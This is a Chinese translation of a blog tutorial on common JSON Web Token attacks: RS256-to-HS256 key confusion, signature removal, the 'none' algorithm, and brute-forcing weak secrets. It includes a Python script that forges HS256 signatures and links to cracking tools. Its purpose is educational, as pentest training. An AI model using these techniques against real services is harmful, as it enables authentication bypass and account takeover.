<html>
<head>
<title>JWT Common Attacks</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">JWT 常见攻击</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/jwt-common-attacks-b41de384113e?source=collection_archive---------1-----------------------#2022-08-08">https://blog.devgenius.io/jwt-common-attacks-b41de384113e?source=collection_archive---------1-----------------------#2022-08-08</a></blockquote><div><div class="fc ib ic id ie if"/><div class="ig ih ii ij ik"><div class=""/><h1 id="7151" class="jk jl in bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">什么是 JWT🤔？</h1><p id="6820" class="pw-post-body-paragraph ki kj in kk b kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf ig bi translated">JSON Web 令牌(JWT)用于授权登录的用户，因此在用户登录后，有时 Web 服务器需要检查该用户是否被授权(有权访问)该特定系统/信息。</p><p id="c308" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">JWT 在授权中不使用传统的 cookies 和会话，而是使用 JSON web 令牌</p><figure class="lm ln lo lp gt lq gh gi paragraph-image"><div role="button" tabindex="0" class="lr ls di lt bf lu"><div class="gh gi ll"><img src="../Images/27c8a921c53c2e8e3b2fd01fdfa4c4a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q7zFwegh36Tqe13wNGzx7g.jpeg"/></div></div><figcaption class="lx ly gj gh gi lz ma bd b be z dk translated">饼干与代币</figcaption></figure><h2 id="9095" class="mb jl in bd jm mc md dn jq me mf dp ju kt mg mh jy kx mi mj kc lb mk ml kg mm bi translated"><strong class="ak"> JWT 结构</strong></h2><p id="2eb2" class="pw-post-body-paragraph ki kj in kk b kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf ig bi translated">JWT 由三个主要部分组成:</p><figure class="lm ln lo lp gt lq gh gi paragraph-image"><div role="button" tabindex="0" class="lr ls di lt bf lu"><div class="gh gi mn"><img src="../Images/3335805ef94ff5e01b4af072a57359f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jg0JYy3KEiwy8BaNUHlw7A.png"/></div></div><figcaption class="lx ly gj gh gi lz ma bd b be z dk translated">JWT 示例令牌</figcaption></figure><ol class=""><li id="8c03" class="mo mp in kk b kl lg kp lh kt mq kx mr lb ms lf mt mu mv mw bi translated"><strong class="kk io">报头</strong> <br/> -报头是 JWT 令牌的最上面部分，它指定了将在签名部分使用哪种算法来生成签名(更多信息请参见签名)<br/>算法可以是以下之一:无(无编码)、HS256、RS256。</li></ol><p id="6a41" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">2.<strong class="kk io"> Payload </strong> <br/>这是令牌中的主要消息，其中包含关于将被授权或未被授权的用户/组织的重要信息。<br/>有效载荷的静态字段之一是“iat ”,它是生成的 JWT 的时间戳，其他有效载荷元素根据使用的 web 应用程序而变化。<br/> <br/> <code class="fe mx my mz na b">{<br/> "sub": "1234567890",<br/> "name": "John Doe",<br/> "admin": true<br/>}</code></p><p id="d9df" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">3.<strong class="kk io">签名</strong>base64 格式的标头。<br/> 2。base64 格式的有效负载。<br/> 3。用于生成签名的秘密密钥(根据标题中规定的算法)，对于 RS256 等不对称算法，有时是 2 个密钥(私有+公共)。</p><figure class="lm ln lo lp gt lq gh gi paragraph-image"><div role="button" tabindex="0" class="lr ls di lt bf lu"><div class="gh gi nb"><img src="../Images/03e53db823304bce6a581e6b29dce907.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aAH0mMomx1dLidhoNCVmNw.png"/></div></div><figcaption class="lx ly gj gh gi lz ma bd b be z dk translated">JWT 令牌(已解码)</figcaption></figure><p id="17e2" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">也许你现在正在挠头，想知道像 RS256 这样的强非对称算法会造成什么类型的攻击，但事实上我们有许多方法可以绕过签名部分。</p><p id="5111" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">我们将解释可以用 jwt 进行的 4 大攻击。</p><h1 id="66ed" class="jk jl in bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">1.RSA 对 HMAC 攻击</h1><p id="5f02" class="pw-post-body-paragraph ki kj in kk b kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf ig bi translated">正如我们提到的，我们有两种主要的加密算法，RS256 和 HS256，当然我们都知道 RS256 是不对称的，因此很难破解，因为它使用私钥/公钥组合。</p><p id="8afe" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">-参考此链接了解更多 RSA vs HMAC:<a class="ae nc" href="https://connect2id.com/products/nimbus-jose-jwt/algorithm-selection-guide" rel="noopener ugc nofollow" target="_blank">https://connect 2 id . com/products/nimbus-Jose-jwt/algorithm-selection-guide</a></p><ul class=""><li id="3742" class="mo mp in kk b kl lg kp lh kt mq kx mr lb ms lf nd mu mv mw bi translated">使用(Burpsuite)或您熟悉的任何代理截取请求，并将其发送给中继器以更改请求。</li><li id="abc0" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">第一步是将报头算法从“RS256”更改为“HS256”。</li><li id="65af" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">获取网站的公钥(可以在他们的证书中找到或在互联网上泄露),您可以查找类似的目录。知名或常用的目录或 jks.json 文件<br/>也指这个神奇的网站:<a class="ae nc" href="https://connect2id.com/products/nimbus-jose-jwt/examples/jwk-retrieval" rel="noopener ugc nofollow" target="_blank">https://connect 2 id . com/products/nimbus-Jose-jwt/examples/jwk-retrieval</a></li><li id="8f9e" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">保存公钥后，我们需要用相同的密钥(公钥)生成新的签名，因为记住现在我们使用的是 HS256，它使用相同的密钥进行签名/加密。</li><li id="0d6d" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">要生成新签名，请参考以下代码片段:</li></ul><pre class="lm ln lo lp gt nj na nk nl aw nm bi"><span id="b301" class="mb jl in na b gy nn no l np nq">import hashlib<br/>import base64<br/>import hmac</span><span id="8e2a" class="mb jl in na b gy nr no l np nq">file=open('key.pem')<br/><br/>key = file.read()<br/><br/>#Change Header and payload to the one you intercepted and alter it#<br/>header = '{"alg":"HS256",<br/>           "typ": "jwt"}'<br/>payload = '<!-- -->{<br/>  "sub": "1234567890",<br/>  "name": "John Doe",<br/>  "admin": true<br/>}<!-- -->'<br/><br/>#encoding Header<br/>encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))<br/>encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")<br/><br/>#Encoding payload<br/>encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))<br/>encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")<br/><br/>complete_jwt = (encodedHeader + "." + encodedPayload)<br/><br/>#Creating the whole Signature</span><span id="cf42" class="mb jl in na b gy nr no l np nq">#try:<br/>signature = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),complete_jwt.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")<br/><br/>print(complete_jwt + "." + signature)</span></pre><ul class=""><li id="3eaf" class="mo mp in kk b kl lg kp lh kt mq kx mr lb ms lf nd mu mv mw bi translated">将签名更改为您刚刚生成的签名，并使用 burp 发送更改后的请求，希望一切顺利。</li></ul><p id="65ff" class="pw-post-body-paragraph ki kj in kk b kl lg kn ko kp lh kr ks kt li kv kw kx lj kz la lb lk ld le lf ig bi translated">__ 免责声明:这种方法仅在后端服务器存在允许改变算法的 RS-HS 漏洞时有效，尽管这种攻击非常有名，但它现在只在少数网站上有效😢。</p><h1 id="352f" class="jk jl in bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">2.无效签名攻击</h1><p id="fdf0" class="pw-post-body-paragraph ki kj in kk b kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf ig bi translated">这种攻击比第一种容易得多，你只需截取消息，发送给中继器，猜猜是什么删除了整个签名，然后期待最好的结果。<br/> *这种攻击是一种严重的安全错误配置，通常只能在安全实践较差的中小型组织中发现。</p><h1 id="0371" class="jk jl in bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">3.无算法攻击</h1><p id="ae2c" class="pw-post-body-paragraph ki kj in kk b kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf ig bi translated">这种类型的攻击与第一种和第二种非常相似。</p><ul class=""><li id="12c5" class="mo mp in kk b kl lg kp lh kt mq kx mr lb ms lf nd mu mv mw bi translated">您截获了消息，这次通过将“algorithm”值更改为“none ”,并将有效负载更改为您想要的任何值(您可以保持签名不变)来更改消息头。</li><li id="76d7" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">一些 web 服务器没有不接受除一个算法之外的任何算法的规则(弱治理实践)。</li><li id="df02" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">这种攻击在过去几年非常有名，直到我写这篇文章的时候，许多顶级公司都有这种攻击。</li><li id="dc0a" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">参考我这里的朋友提炼出来的非算法攻击:<a class="ae nc" href="https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771" rel="noopener ugc nofollow" target="_blank">https://blog . pentesteacademy . com/hacking-jwt-tokens-the-None-algorithm-67c 14 bb 15771</a></li></ul><h1 id="127c" class="jk jl in bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">4.强力签名</h1><ul class=""><li id="1cd2" class="mo mp in kk b kl km kp kq kt ns kx nt lb nu lf nd mu mv mw bi translated">虽然这不被认为是一个漏洞，您也不会因此获得任何奖励，但它有时对发现其他漏洞很有用</li><li id="cc68" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">这种攻击只对 HS256 有效，对非对称加密无效(除非你有量子计算机)。</li><li id="085f" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">说到后端，一些加密密钥并不像它们应该的那样好，所以它并不是完全随机的，我自己也看到过由于生成的密钥缺乏随机性，签名在很短的时间内被破解。</li><li id="8c84" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf nd mu mv mw bi translated">有很多工具可用，但是我建议你先自己检查签名，然后决定应该使用什么工具，不管怎样，这些是我最喜欢使用的工具(你也可以使用 burp extension)。<br/><a class="ae nc" href="https://github.com/lmammino/jwt-cracker" rel="noopener ugc nofollow" target="_blank">【https://github.com/lmammino/jwt-cracker】</a><br/><a class="ae nc" href="https://github.com/x1sec/gojwtcrack" rel="noopener ugc nofollow" target="_blank"><strong class="kk io">https://github.com/x1sec/gojwtcrack</strong></a></li></ul><figure class="lm ln lo lp gt lq gh gi paragraph-image"><div role="button" tabindex="0" class="lr ls di lt bf lu"><div class="gh gi gj"><img src="../Images/9abc7eb744b18d5cb999c9c48462616a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qwPnYugXl4kbAuHe_x2v5A.png"/></div></div><figcaption class="lx ly gj gh gi lz ma bd b be z dk translated">JWT 蛮力在行动</figcaption></figure><figure class="lm ln lo lp gt lq gh gi paragraph-image"><div role="button" tabindex="0" class="lr ls di lt bf lu"><div class="gh gi nv"><img src="../Images/ac0ec7d234d15160cd9fdb3d50ce65d4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*sBikBw1xxjdl3SQT.png"/></div></div></figure><h1 id="6093" class="jk jl in bd jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh bi translated">参考文献</h1><ol class=""><li id="5542" class="mo mp in kk b kl km kp kq kt ns kx nt lb nu lf mt mu mv mw bi translated"><a class="ae nc" href="https://www.thehacker.recipes/web/inputs/insecure-json-web-tokens" rel="noopener ugc nofollow" target="_blank">https://www . the hacker . recipes/web/inputs/secure-JSON-web-tokens</a></li><li id="1615" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf mt mu mv mw bi translated"><a class="ae nc" href="https://www.youtube.com/watch?v=4V3GXPViXxQ&amp;t=2024s" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/watch?v=4V3GXPViXxQ&amp;t = 2024s</a></li><li id="dd77" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf mt mu mv mw bi translated"><a class="ae nc" href="https://blog.intigriti.com/2021/07/27/hacker-tools-jwt_tool/" rel="noopener ugc nofollow" target="_blank">https://blog . intigriti . com/2021/07/27/hacker-tools-jwt _ tool/</a></li><li id="e363" class="mo mp in kk b kl ne kp nf kt ng kx nh lb ni lf mt mu mv mw bi translated"><a class="ae nc" href="https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e" rel="noopener ugc nofollow" target="_blank">https://infosecwriteups . com/attacks-on-JSON-we b-token-jwt-278 a 49 a1 ad2e</a></li></ol></div></div>    
</body>
</html>